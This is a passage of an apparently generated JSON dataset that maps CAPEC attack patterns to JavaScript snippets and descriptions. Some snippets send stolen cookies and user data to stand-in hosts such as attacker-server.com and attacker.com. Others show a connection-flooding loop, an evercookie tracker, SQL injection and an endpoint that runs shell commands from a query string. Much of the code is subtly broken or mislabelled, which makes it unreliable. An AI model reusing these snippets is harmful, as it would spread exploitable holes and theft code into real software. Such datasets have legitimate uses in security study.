        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction maliciousDLL() {\n    const dllPath = 'C:\\\\Windows\\\\System32\\\\malicious.dll';\n    const benignPath = 'C:\\\\Program Files\\\\BenignSoftware\\\\benign.dll';\n\n    // CWE-507: Trojan Horse\n    fs.copyFileSync(dllPath, benignPath);\n\n    // CWE-506: Embedded Malicious Code\n    const maliciousCode = 'const WshShell = new ActiveXObject(\"WScript.Shell\"); WshShell.Run(\"cmd.exe /c start https://malicious-website.com\"), 0, true);';\n    fs.writeFileSync(benignPath, maliciousCode);\n\n    // CWE-426: Untrusted Search Path\n    process.env.PATH = 'C:\\\\Windows\\\\System32;C:\\\\Program Files\\\\BenignSoftware';\n\n    // CWE-67: Improper Handling of Windows Device Names\n    const deviceName = 'CON';\n    const filePath = `C:\\\\${deviceName}\\\\malicious.txt`;\n    fs.writeFileSync(filePath, 'Malicious file content');\n\n    // CWE-509: Replicating Malicious Code (Virus or Worm)\n    const wormCode = 'const net = require(\"net\"); const server = net.createServer((socket) => {\n        socket.write(\"Malicious payload\");\n    }); server.listen(8080, () => {\n        console.log(\"Malicious server started\");\n    });';\n    fs.writeFileSync('C:\\\\malicious-worm.js', wormCode);\n}\nmaliciousDLL();",
        "description": "This JavaScript code snippet demonstrates the deprecated CAPEC pattern of embedding a virus into a DLL. It includes various CWEs, such as Trojan Horse, Embedded Malicious Code, Untrusted Search Path, Improper Handling of Windows Device Names, and Replicating Malicious Code (Virus or Worm). The code copies a malicious DLL to a benign location, embeds malicious code, sets an untrusted search path, handles Windows device names improperly, and replicates malicious code."
    },
    {
        "capec_id": "451",
        "code_snippet": "const dns = require('dns');\n\nfunction updateFirmware() {\n  // CWE-247: Reliance on DNS Lookups in a Security Decision\n  dns.lookup('malicious-domain.com', (err, address) => {\n    if (address) {\n      // CWE-589: Call to Non-ubiquitous API\n      const api = require('non-ubiquitous-api');\n      api.updateFirmware();\n    }\n  });\n}\n\n// CWE-1277: Firmware Not Updateable\nupdateFirmware = null;\n\n// CWE-592: DEPRECATED: Authentication Bypass Issues\n// (Note: This CWE is deprecated, but for demonstration purposes, we'll include it)\nfunction authenticate() {\n  // Bypass authentication\n  return true;\n}\n\n// CWE-507: Trojan Horse\nfunction benignFunctionality() {\n  // Hidden malicious code\n  const maliciousCode = require('malicious-code');\n  maliciousCode.execute();\n}\nbenignFunctionality();",
        "description": "This code snippet demonstrates a deprecated CAPEC pattern that involves malware infection into product software. It includes various CWEs such as reliance on DNS lookups in a security decision, call to non-ubiquitous API, firmware not updateable, authentication bypass issues, and Trojan Horse. The code intentionally includes vulnerabilities and weaknesses to illustrate the CAPEC pattern."
    },
    {
        "capec_id": "452",
        "code_snippet": "const maliciousCode = `while (true) { // CWE-509: Replicating malicious code\n  try {\n    // CWE-506: Embedded malicious code\n    const registerInterface = getMemoryMappedIORegisters();\n    // CWE-1262: Improper access control for register interface\n    registerInterface.write('malicious_data', 0xdeadbeef);\n    // CWE-1313: Hardware allows activation of test or debug logic at runtime\n    activateDebugLogic();\n    // CWE-1247: Improper protection against voltage and clock glitches\n    const glitch = generateVoltageGlitch();\n    processSensitiveData(glitch);\n  } catch (e) {\n    console.error('Malicious code failed:', e);\n  }\n}\n`; const eval = window.eval; eval(maliciousCode);",
        "description": "This JavaScript code snippet demonstrates the CAPEC pattern of inserting malicious logic into hardware. It uses various CWEs to illustrate the attack: CWE-506 embedded malicious code, CWE-509 replicating malicious code, CWE-1262 improper access control for register interface, CWE-1313 hardware allows activation of test or debug logic at runtime, and CWE-1247 improper protection against voltage and clock glitches. The code injects malicious data into memory-mapped I/O registers, activates debug logic, and generates a voltage glitch to compromise sensitive data."
    },
    {
        "capec_id": "453",
        "code_snippet": "const maliciousCode = `function injectErrorIntoRedundantBlock() {\n  // CWE-1334: inject error into redundant block\n  const redundantBlock = getRedundantBlock();\n  redundantBlock.injectError();\n}\n\nfunction authenticateByReplay() {\n  // CWE-294: authentication bypass by capture-replay\n  const sniffedNetworkTraffic = sniffNetworkTraffic();\n  const replayedMessage = modifyMessage(sniffedNetworkTraffic);\n  sendReplayedMessageToServer(replayedMessage);\n}\n\nfunction storeMaliciousData() {\n  // CWE-506: embedded malicious code\n  const maliciousData = 'malicious_code_here';\n  storeData(maliciousData);\n}\n\ninjectErrorIntoRedundantBlock();\nauthenticateByReplay();\nstoreMaliciousData();`;",
        "description": "This code snippet demonstrates the deprecated CAPEC pattern of malicious logic insertion into product hardware. It includes CWE-1334 unauthorized error injection, CWE-294 authentication bypass by capture-replay, and CWE-506 embedded malicious code."
    },
    {
        "capec_id": "454",
        "code_snippet": "const maliciousCode = `const backdoor = () => { /* malicious logic */ }; backdoor();`; const firmwareUpdate = (newCode) => { /* update mechanism */ }; firmwareUpdate(maliciousCode);",
        "description": "This code snippet demonstrates the concept of malicious logic insertion into product hardware. It includes a backdoor function that can be injected into the firmware update mechanism, which is not properly validated or updated, allowing an attacker to insert malicious code. This code relates to CWE-506 (Embedded Malicious Code), CWE-1329 (Reliance on Component That is Not Updateable), and CWE-1242 (Inclusion of Undocumented Features or Chicken Bits)."
    },
    {
        "capec_id": "455",
        "code_snippet": "const redundantSystem = {\n  mode: 'normal',\n  redundancyLevel: 3\n};\n\nfunction injectError(errorCode) {\n  // CWE-506: Embedded Malicious Code\n  if (errorCode === 'MALICIOUS_CODE') {\n    redundantSystem.redundancyLevel -= 1;\n    console.log('Redundancy level decreased');\n  }\n}\n\nfunction authenticateUser(username, password) {\n  // CWE-592: DEPRECATED: Authentication Bypass Issues (redundant concept in CWE-287)\n  if (username === 'admin' && password === 'password') {\n    return true;\n  } else {\n    return false;\n  }\n}\n\nfunction storeData(data) {\n  // CWE-217: DEPRECATED: Failure to Protect Stored Data from Modification\n  // CWE-218: DEPRECATED: Failure to provide confidentiality for stored data\n  localStorage.setItem('data', data);\n}\n\nfunction injectUnauthorizedError() {\n  // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n  injectError('UNAUTHORIZED_ERROR');\n}\n",
        "description": "This code snippet demonstrates the CAPEC pattern of malicious logic insertion into product hardware. It includes embedded malicious code (CWE-506) that can decrease the redundancy level of a system when a specific error code is injected. The code also includes deprecated authentication bypass issues (CWE-592) and failures to protect and provide confidentiality for stored data (CWE-217 and CWE-218). Additionally, it shows how an unauthorized agent can inject errors to degrade hardware redundancy (CWE-1334)."
    },
    {
        "capec_id": "456",
        "code_snippet": "const mirroredMemoryRegion = 0x1000;\nconst aliasedMemoryRegion = 0x2000;\nconst protectedMemoryRange = {\n  start: 0x3000,\n  end: 0x4000\n};\n\nfunction accessMemoryRegion(region) {\n  if (region === mirroredMemoryRegion) {\n    // Insecure access control: allow access to aliased memory region\n    return aliasedMemoryRegion;\n  } else if (region === aliasedMemoryRegion) {\n    // Insecure access control: allow access to mirrored memory region\n    return mirroredMemoryRegion;\n  } else if (region >= protectedMemoryRange.start && region <= protectedMemoryRange.end) {\n    // Insecure handling of overlap: allow access to overlapping protected memory range\n    return region;\n  } else {\n    // Secure access control: deny access to unauthorized memory region\n    throw new Error('Access denied');\n  }\n}\n\n// Example usage:\ntry {\n  const maliciousCode = accessMemoryRegion(mirroredMemoryRegion);\n  // Malicious code can now access aliased memory region\n  console.log(maliciousCode);\n} catch (error) {\n  console.error(error);\n}",
        "description": "This code snippet demonstrates the CAPEC pattern of inserting malicious logic into memory, exploiting vulnerabilities in access control for mirrored or aliased memory regions, overlap between protected memory ranges, and lack of protection for volatile memory containing boot code. The `accessMemoryRegion` function allows unauthorized access to mirrored or aliased memory regions, and permits overlap between protected memory ranges, enabling an adversary to achieve a negative impact."
    },
    {
        "capec_id": "457",
        "code_snippet": "const usbMalware = {\n  maliciousCode: `/* embedded malicious code */`,\n  sniffNetworkTraffic: () => {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    const networkTraffic = sniffNetwork();\n    const stolenData = analyzeNetworkTraffic(networkTraffic);\n    return stolenData;\n  },\n  monitorKeystrokes: () => {\n    // CWE-506: Embedded Malicious Code\n    const keystrokeLogger = new KeystrokeLogger();\n    const stolenKeystrokes = keystrokeLogger.logKeystrokes();\n    return stolenKeystrokes;\n  },\n  exfiltrateData: (stolenData) => {\n    // CWE-1300: Improper Protection of Physical Side Channels\n    const wirelessConnection = establishWirelessConnection();\n    wirelessConnection.sendData(stolenData);\n  }\n};\n\n// CWE-1299: Missing Protection Mechanism for Alternate Hardware Interface\nconst usbDevice = new USBDevice();\nusbDevice.connect();\n\n// CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\nconst emfiAttack = new EMFIAttack();\nconst compromisedData = emfiAttack.injectFault(usbDevice);\nusbMalware.exfiltrateData(compromisedData);",
        "description": "This JavaScript code snippet demonstrates a malicious USB device that can infect a system, sniff network traffic, monitor keystrokes, and exfiltrate stolen data via a wireless connection. It embodies the main idea of the CAPEC and incorporates related CWEs, including missing protection mechanisms, improper protection of physical side channels, embedded malicious code, and improper protection against electromagnetic fault injection."
    },
    {
        "capec_id": "458",
        "code_snippet": "const maliciousCode = `/* malicious logic */ console.log('I am a malicious code!'); /* malicious logic */`; const writableMemory = new Uint8Array(1024); writableMemory.set(maliciousCode, 0); const bootloader = { /* assumed immutable data */ }; Object.defineProperty(bootloader, 'secureBoot', { value: () => { /* insecure access control */ const volatileMemory = new Uint8Array(1024); volatileMemory.set(writableMemory, 0); return volatileMemory; } }); const emFiAttack = () => { /* electromagnetic fault injection */ const faultInjectedData = bootloader.secureBoot(); console.log(faultInjectedData); }; const speculativeExecution = () => { /* transient execution */ const microarchitecturalState = bootloader.secureBoot(); console.log(microarchitecturalState); };",
        "description": "This JavaScript code snippet demonstrates the CAPEC of inserting malicious logic into a product or technology via flashing the on-board memory with a code-base that contains malicious logic. It uses related CWEs such as CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory), CWE-506 (Embedded Malicious Code), CWE-1274 (Improper Access Control for Volatile Memory Containing Boot Code), CWE-1319 (Improper Protection against Electromagnetic Fault Injection (EM-FI)), and CWE-1342 (Information Exposure through Microarchitectural State after Transient Execution). The code defines a malicious code snippet, stores it in writable memory, and then uses insecure access control to load it into volatile memory. It also demonstrates electromagnetic fault injection and transient execution attacks."
    },
    {
        "capec_id": "459",
        "code_snippet": "const crypto = require('crypto');\nconst hash = crypto.createHash('md5'); // CWE-327: Using a broken or risky cryptographic algorithm (MD5)\n\nconst csr1 = {\n  subject: 'CN=example.com',\n  publicKey: '...'\n};\nconst csr2 = {\n  subject: 'CN=evil.com',\n  publicKey: '...'\n};\n\n// Generate collision blocks\nconst collisionBlock = '...';\nconst csr1Data = Buffer.from(JSON.stringify(csr1) + collisionBlock);\nconst csr2Data = Buffer.from(JSON.stringify(csr2) + collisionBlock);\n\n// Hash the CSRs\nconst csr1Hash = hash.update(csr1Data).digest('hex');\nconst csr2Hash = hash.update(csr2Data).digest('hex');\n\n// Submit csr1 to the trusted certificate authority\nconst signedCsr1 = getSignedCertificate(csr1Hash);\n\n// Use the signed blob to create a new certificate\nconst evilCert = {\n  subject: csr2.subject,\n  publicKey: csr2.publicKey,\n  signature: signedCsr1.signature\n};\n\n// CWE-295: Improper Certificate Validation - The product does not validate, or incorrectly validates, a certificate.\n// CWE-290: Authentication Bypass by Spoofing - This attack-focused weakness is caused by incorrectly implemented authentication schemes that are subject to spoofing attacks.\n// CWE-296: Improper Following of a Certificate's Chain of Trust - The product does not follow, or incorrectly follows, the chain of trust for a certificate back to a trusted root certificate, resulting in incorrect trust of any resource that is associated with that certificate.\n// CWE-297: Improper Validation of Certificate with Host Mismatch - The product communicates with a host that provides a certificate, but the product does not properly ensure that the certificate is actually associated with that host.\n\nfunction getSignedCertificate(hash) {\n  // Simulate the trusted certificate authority signing the CSR\n  return {\n    signature: '...' // Signed blob\n  };\n}",
        "description": "This code snippet demonstrates the CAPEC, where an adversary exploits a weakness in a hashing algorithm with weak collision resistance to generate certificate signing requests (CSR) that contain collision blocks. The adversary submits one CSR to be signed by a trusted certificate authority, then uses the signed blob to create a new certificate that appears to be signed by the same authority, bypassing authentication and certificate validation."
    },
    {
        "capec_id": "460",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const param1 = req.query.param1;\n  const param2 = req.query.param2;\n  const query = `SELECT * FROM data WHERE param1 = '${param1}' AND param2 = '${param2}'`;\n  db.query(query, (err, result) => {\n    if (err) {\n      res.status(500).send({ error: 'Error fetching data' });\n    } else {\n      res.send(result);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript code that is susceptible to HTTP Parameter Pollution (HPP) attack. The code uses Express.js to handle GET requests and retrieve data from a database. The query parameters 'param1' and 'param2' are not properly sanitized, allowing an attacker to inject duplicate parameters and manipulate the SQL query. This can lead to unauthorized access, data tampering, and bypassing of input validation checkpoints and WAF rules."
    },
    {
        "capec_id": "461",
        "code_snippet": "const crypto = require('crypto');\n\nconst weakHashFunction = (input) => {\n  const hash = crypto.createHash('md5'); // CWE-328: Using weak hash function MD5\n  hash.update(input);\n  return hash.digest('hex');\n};\n\nconst authenticate = (username, password, token) => {\n  const signature = weakHashFunction(username + password + token);\n  // CWE-290: Authentication Bypass by Spoofing, CWE-305: Authentication Bypass by Primary Weakness\n  if (signature === 'expected_signature') {\n    return true;\n  } else {\n    return false;\n  }\n};\n\nconst csrfToken = 'weak_csrf_token'; // CWE-352: Cross-Site Request Forgery (CSRF)\n\napp.post('/login', (req, res) => {\n  const { username, password, token } = req.body;\n  if (authenticate(username, password, token)) {\n    res.send('Authenticated');\n  } else {\n    res.send('Authentication failed');\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable authentication mechanism that uses a weak hash function (MD5) to generate a signature. An adversary can exploit this weakness to generate a legitimate signature hash without knowledge of the secret token, allowing them to bypass authentication. The code also lacks proper CSRF protection and uses weak authentication mechanisms, making it vulnerable to spoofing attacks."
    },
    {
        "capec_id": "462",
        "code_snippet": "const img = new Image();\nimg.src = 'https://example.com/admin/secret?cookie=' + encodeURIComponent(document.cookie) + '&_=' + new Date().getTime();\n\nconst start = new Date().getTime();\nimg.onload = function() {\n  const end = new Date().getTime();\n  const timeTaken = end - start;\n  if (timeTaken < 100) {\n    console.log('Access denied');\n  } else {\n    console.log('Access granted');\n  }\n};",
        "description": "This JavaScript code snippet demonstrates a timing attack to bypass access control. It creates an image object and sets its source to a URL that includes the current cookie and a timestamp. The onload event is used to measure the time taken for the server to respond. If the time taken is less than 100ms, it indicates that access was denied, otherwise, it indicates that access was granted. This attack exploits the CWE-385 Covert Timing Channel, CWE-352 Cross-Site Request Forgery (CSRF), CWE-208 Observable Timing Discrepancy, CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'), and CWE-942 Permissive Cross-domain Policy with Untrusted Domains."
    },
    {
        "capec_id": "463",
        "code_snippet": "const crypto = require('crypto');\n\nfunction decrypt(ciphertext, key) {\n  try {\n    const decipher = crypto.createDecipher('aes-256-cbc', key);\n    decipher.setAutoPadding(true);\n    const decrypted = decipher.update(ciphertext, 'hex', 'utf8') + decipher.final('utf8');\n    return decrypted;\n  } catch (e) {\n    if (e.message.includes('bad decrypt')) {\n      throw new Error('Invalid padding');\n    } else {\n      throw e;\n    }\n  }\n}\n\nfunction encrypt(plaintext, key) {\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  cipher.setAutoPadding(true);\n  let encrypted = cipher.update(plaintext, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Example usage:\nconst key = 'my_secret_key';\nconst plaintext = 'Hello, World!';\nconst ciphertext = encrypt(plaintext, key);\n\n// Simulating an adversary's attempt to decrypt the ciphertext without the key\nfor (let i = 0; i < 128 * 16; i++) {\n  const modifiedCiphertext = modifyCiphertext(ciphertext);\n  try {\n    decrypt(modifiedCiphertext, 'wrong_key');\n  } catch (e) {\n    if (e.message === 'Invalid padding') {\n      // Adversary learns that the padding is invalid\n      console.log('Invalid padding');\n    } else {\n      console.log('Error: ' + e.message);\n    }\n  }\n}\n",
        "description": "This code snippet demonstrates a vulnerable decryption function that leaks information about padding errors, making it a padding oracle. An adversary can use this oracle to efficiently decrypt data without knowing the decryption key. The code also includes an encryption function that uses the same key. The example usage shows how an adversary can attempt to decrypt the ciphertext without the key, exploiting the padding oracle vulnerability."
    },
    {
        "capec_id": "464",
        "code_snippet": "function createEvercookie() {\n\t\tvar cookieName = 'evercookie';\n\t\tvar cookieValue = 'sensitive_info=' + Math.random();\n\t\tvar storageLocations = ['localStorage', 'sessionStorage', 'IndexedDB', 'WebSQL', 'Flash Local Shared Objects', 'Silverlight Isolated Storage', 'HTML5 Session Storage', 'HTML5 Local Storage', 'Etag', 'HTTP Cache', 'window.name'];\n\t\t\n\t\tfunction setCookie() {\n\t\t\tfor (var i = 0; i < storageLocations.length; i++) {\n\t\t\t\tif (storageLocations[i] === 'localStorage') {\n\t\t\t\t\tlocalStorage.setItem(cookieName, cookieValue);\n\t\t\t\t} else if (storageLocations[i] === 'sessionStorage') {\n\t\t\t\t\tsessionStorage.setItem(cookieName, cookieValue);\n\t\t\t\t} else if (storageLocations[i] === 'IndexedDB') {\n\t\t\t\t\t// create IndexedDB database and store cookie\n\t\t\t\t} else if (storageLocations[i] === 'WebSQL') {\n\t\t\t\t\t// create WebSQL database and store cookie\n\t\t\t\t} else if (storageLocations[i] === 'Flash Local Shared Objects') {\n\t\t\t\t\t// create Flash Local Shared Object and store cookie\n\t\t\t\t} else if (storageLocations[i] === 'Silverlight Isolated Storage') {\n\t\t\t\t\t// create Silverlight Isolated Storage and store cookie\n\t\t\t\t} else if (storageLocations[i] === 'HTML5 Session Storage') {\n\t\t\t\t\t// create HTML5 Session Storage and store cookie\n\t\t\t\t} else if (storageLocations[i] === 'HTML5 Local Storage') {\n\t\t\t\t\t// create HTML5 Local Storage and store cookie\n\t\t\t\t} else if (storageLocations[i] === 'Etag') {\n\t\t\t\t\t// set Etag header with cookie value\n\t\t\t\t} else if (storageLocations[i] === 'HTTP Cache') {\n\t\t\t\t\t// set HTTP Cache header with cookie value\n\t\t\t\t} else if (storageLocations[i] === 'window.name') {\n\t\t\t\t\twindow.name = cookieValue;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\tfunction replicateCookie() {\n\t\t\tfor (var i = 0; i < storageLocations.length; i++) {\n\t\t\t\tif (storageLocations[i] === 'localStorage') {\n\t\t\t\t\tif (!localStorage.getItem(cookieName)) {\n\t\t\t\t\t\tlocalStorage.setItem(cookieName, cookieValue);\n\t\t\t\t\t}\n\t\t\t\t} else if (storageLocations[i] === 'sessionStorage') {\n\t\t\t\t\tif (!sessionStorage.getItem(cookieName)) {\n\t\t\t\t\t\tsessionStorage.setItem(cookieName, cookieValue);\n\t\t\t\t\t}\n\t\t\t\t} else if (storageLocations[i] === 'IndexedDB') {\n\t\t\t\t\t// check if cookie exists in IndexedDB, if not, create and store\n\t\t\t\t} else if (storageLocations[i] === 'WebSQL') {\n\t\t\t\t\t// check if cookie exists in WebSQL, if not, create and store\n\t\t\t\t} else if (storageLocations[i] === 'Flash Local Shared Objects') {\n\t\t\t\t\t// check if cookie exists in Flash Local Shared Object, if not, create and store\n\t\t\t\t} else if (storageLocations[i] === 'Silverlight Isolated Storage') {\n\t\t\t\t\t// check if cookie exists in Silverlight Isolated Storage, if not, create and store\n\t\t\t\t} else if (storageLocations[i] === 'HTML5 Session Storage') {\n\t\t\t\t\t// check if cookie exists in HTML5 Session Storage, if not, create and store\n\t\t\t\t} else if (storageLocations[i] === 'HTML5 Local Storage') {\n\t\t\t\t\t// check if cookie exists in HTML5 Local Storage, if not, create and store\n\t\t\t\t} else if (storageLocations[i] === 'Etag') {\n\t\t\t\t\t// check if Etag header exists with cookie value, if not, set\n\t\t\t\t} else if (storageLocations[i] === 'HTTP Cache') {\n\t\t\t\t\t// check if HTTP Cache header exists with cookie value, if not, set\n\t\t\t\t} else if (storageLocations[i] === 'window.name') {\n\t\t\t\t\tif (window.name !== cookieValue) {\n\t\t\t\t\t\twindow.name = cookieValue;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\tsetCookie();\n\t\tsetInterval(replicateCookie, 1000);\n\t}\n\tcreateEvercookie();",
        "description": "This JavaScript code creates an 'evercookie' that persists across multiple storage locations, including local storage, session storage, IndexedDB, WebSQL, Flash Local Shared Objects, Silverlight Isolated Storage, HTML5 Session Storage, HTML5 Local Storage, Etag, HTTP Cache, and window.name. The cookie is set with a random value and replicated across all storage locations every second, ensuring that it remains present even after the user attempts to clear it."
    },
    {
        "capec_id": "465",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nconst proxy = http.createServer((req, res) => {\n  const targetUrl = url.parse(req.url);\n  const proxyReq = http.request({\n    hostname: targetUrl.hostname,\n    port: targetUrl.port,\n    path: targetUrl.path,\n    method: req.method,\n    headers: req.headers\n  }, (proxyRes) => {\n    res.writeHead(proxyRes.statusCode, proxyRes.headers);\n    proxyRes.pipe(res);\n  });\n  req.pipe(proxyReq);\n});\nproxy.listen(8080, () => {\n  console.log('Proxy server listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a transparent proxy server that forwards client requests to the intended destination without properly preserving the original source of the request. It also fails to consistently interpret malformed HTTP requests or responses, and does not correctly specify the intended destination for outgoing requests. This code is vulnerable to various attacks, including HTTP request smuggling and confused deputy attacks."
    },
    {
        "capec_id": "466",
        "code_snippet": "const xhr = new XMLHttpRequest();\nxhr.open('GET', 'http://non-secure-website.com/data', true);\nxhr.withCredentials = true;\nxhr.onload = function() {\n  if (xhr.status === 200) {\n    const data = xhr.responseText;\n    const maliciousScript = '<script src=\"http://attacker-website.com/malicious.js\"></script>';\n    document.getElementById('data').innerHTML = data + maliciousScript;\n  }\n};\nxhr.send();",
        "description": "This JavaScript code snippet demonstrates a vulnerable code that allows an attacker to bypass the same-origin policy protection in the victim's browser. The code sends a GET request to a non-secure website that does not use TLS, allowing an attacker to intercept the request and response. The attacker can then inject a malicious script into the response, which is executed by the victim's browser due to the permissive cross-domain policy. This code embodies CWE-300 (Channel Accessible by Non-Endpoint), CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints), and CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)."
    },
    {
        "capec_id": "467",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://socialnetworksite.com/api/userinfo?access_token=' + getCookie('access_token'), true); xhr.onload = function() { if (xhr.status === 200) { const userInfo = JSON.parse(xhr.responseText); const victimData = { name: userInfo.name, email: userInfo.email, location: userInfo.location }; sendToAttackerServer(victimData); } }; xhr.send(); function getCookie(name) { const value = `; ${document.cookie}`; const parts = value.split(`; ${name}=`); if (parts.length === 2) return parts.pop().split(';').shift(); } function sendToAttackerServer(data) { const xhr = new XMLHttpRequest(); xhr.open('POST', 'https://attacker-server.com/harvest', true); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify(data)); }",
        "description": "This JavaScript code snippet demonstrates a Cross-Site Request Forgery (CSRF) attack, exploiting the user's active session with a social networking site. It retrieves the user's access token from the cookie, uses it to make a GET request to the social networking site's API to fetch identifying information, and then sends the harvested data to the attacker's server. The code is vulnerable to CWE-352 (CSRF), CWE-359 (Exposure of Private Personal Information), CWE-384 (Session Fixation), CWE-598 (Use of GET Request Method With Sensitive Query Strings), and CWE-79 (Cross-site Scripting)."
    },
    {
        "capec_id": "468",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://example.com/styles.css', true); xhr.withCredentials = true; xhr.onload = function() { const css = xhr.responseText; const regex = /url\\(\"(.*?)\"\\)/g; const matches = css.match(regex); if (matches) { const stolenData = matches[1]; const xhr2 = new XMLHttpRequest(); xhr2.open('POST', 'https://attacker.com/steal', true); xhr2.send(stolenData); } }; xhr.send();",
        "description": "This JavaScript code snippet demonstrates a CSS injection attack, exploiting the CWEs 707, 149, 177, 838, and 79. It sends a request to a cross-domain CSS file, extracts sensitive data from the response using a regex, and then sends the stolen data to the attacker's server. The code takes advantage of the browser's same-origin policy exception for CSS files, allowing the attacker to steal data from the victim's browser."
    },
    {
        "capec_id": "469",
        "code_snippet": "const http = require('http');\n\nlet sessions = [];\n\nfor (let i = 0; i < 1000; i++) {\n    let req = http.request({'method': 'GET', 'hostname': 'target-web-app.com', 'path': '/'}, (res) => {\n        res.on('data', () => {});\n    });\n    req.end();\n    sessions.push(req);\n}\n\nsetInterval(() => {\n    sessions.forEach((req) => {\n        req.write(' '); // keep the session alive\n    });\n}, 1000);",
        "description": "This JavaScript code snippet demonstrates an HTTP-level flooding attack, similar to a SYN flood, targeting a web application. It creates 1000 concurrent HTTP requests, keeping each session alive indefinitely by periodically sending a space character. This can lead to resource depletion on the web server, as it waits for responses on the initiated HTTP sessions, exhausting connection threads. CWEs 770, 772, 488, 410, and 384 are relevant, as the code exploits weaknesses in resource allocation, release, and session management."
    },
    {
        "capec_id": "470",
        "code_snippet": "const mysql = require('mysql');\nconst express = require('express');\nconst app = express();\n\napp.get('/users', (req, res) => {\n  const userId = req.query.userId;\n  const query = `SELECT * FROM users WHERE id = ${userId};`;\n  const connection = mysql.createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: 'password',\n    database: 'mydb'\n  });\n\n  connection.query(query, (error, results) => {\n    if (error) {\n      console.error(error);\n      res.status(500).send({ message: 'Error fetching users' });\n    } else {\n      res.send(results);\n    }\n  });\n});\n\napp.get('/executeCommand', (req, res) => {\n  const command = req.query.command;\n  const childProcess = require('child_process');\n  childProcess.exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(error);\n      res.status(500).send({ message: 'Error executing command' });\n    } else {\n      res.send(stdout);\n    }\n  });\n});",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that is susceptible to SQL injection (CWE-89) and execution with unnecessary privileges (CWE-250). The '/users' endpoint constructs a SQL query using user-input data without proper sanitization, allowing an attacker to inject malicious SQL commands. The '/executeCommand' endpoint executes system-level commands using the 'child_process' module, which can be exploited to gain access to the file system and operating system. This code also relates to CWE-564, CWE-1313, and CWE-619, as it uses a dynamic SQL statement built with user-controlled input and does not properly close database cursors."
    },
    {
        "capec_id": "471",
        "code_snippet": "const path = './';\nconst libName = 'myLibrary';\nconst libPath = path + libName + '.dll';\nconst func = require(libPath);\nfunc.doSomething();",
        "description": "This JavaScript code snippet demonstrates the CAPEC of exploiting a weakness in an application's specification of external libraries. The code loads a library from the current directory (./) without properly validating the library's origin or integrity. An attacker can exploit this by placing a rogue library with the same name in the current directory, allowing the attacker to execute arbitrary code. This code relates to CWE-427 (Uncontrolled Search Path Element), CWE-426 (Untrusted Search Path), and CWE-69 (Improper Handling of Windows ::DATA Alternate Data Stream)."
    },
    {
        "capec_id": "472",
        "code_snippet": "var userAgent = navigator.userAgent; var browserType = ''; if(userAgent.indexOf('Chrome') != -1){ browserType = 'Chrome'; } else if(userAgent.indexOf('Firefox') != -1){ browserType = 'Firefox'; } else if(userAgent.indexOf('MSIE') != -1){ browserType = 'IE'; } var browserVersion = userAgent.match(/(?:rv|rv:|(?:ce|firefox)[/:]|builtin|alibaba|amazon|android|androidbrowser|arora|avant|baidu|blazer|bolt|chrome|chromium|coolnovo|dolfin|dooble|edge|firefox|flock|googlebot|google|ie|iron|kindle|k-meleon|konqueror|liberate|links|lunascape|maemo|maxthon|microsoft|midori|minefield|msie|naver|nokia|opera|opera-mini|opera-mobi|operratv|origin|polaris|ps3|rekonq|safari|samsung|seamonkey|silk|skyfire|smart|sogou|srware|tear|telescope|the-world|uc|ucbrowser|uup|vivaldi|webkit|weibo|yandex|yandexbrowser|yahoo|yigou|yisou|zte)[/: ]?([\\d.]+).*$/i)[1]; var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://example.com/exploit?browser=' + browserType + '&version=' + browserVersion, true); xhr.send();",
        "description": "JavaScript code snippet that detects the browser type and version, and sends the information to a server via a GET request, potentially leading to exploitation of known or zero-day vulnerabilities."
    },
    {
        "capec_id": "473",
        "code_snippet": "const crypto = require('crypto');\nconst https = require('https');\n\n// CWE-20: Improper Input Validation\nconst userInput = 'https://example.com'; // Unvalidated user input\nconst url = new URL(userInput);\n\n// CWE-327: Use of a Broken or Risky Cryptographic Algorithm\nconst hash = crypto.createHash('md5'); // Using a broken hash algorithm\nconst signature = hash.update('message').digest('hex');\n\n// CWE-290: Authentication Bypass by Spoofing\nconst spoofedCertificate = {\n  subject: 'CN=example.com',\n  issuer: 'CN=example.com',\n  rawData: '...' // Spoofed certificate data\n};\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nconst options = {\n  hostname: url.hostname,\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false // Disabling certificate verification\n};\n\n// CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\nconst req = https.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log(`Received message: ${data}`);\n  });\n});\n\nreq.write('message');\nreq.end();",
        "description": "This code snippet demonstrates a vulnerable JavaScript implementation that embodies the CAPEC idea of generating a message that causes the recipient to believe it was generated and cryptographically signed by an authoritative or reputable source. The code includes CWE-20: Improper Input Validation, CWE-327: Use of a Broken or Risky Cryptographic Algorithm, CWE-290: Authentication Bypass by Spoofing, CWE-941: Incorrectly Specified Destination in a Communication Channel, and CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel."
    },
    {
        "capec_id": "474",
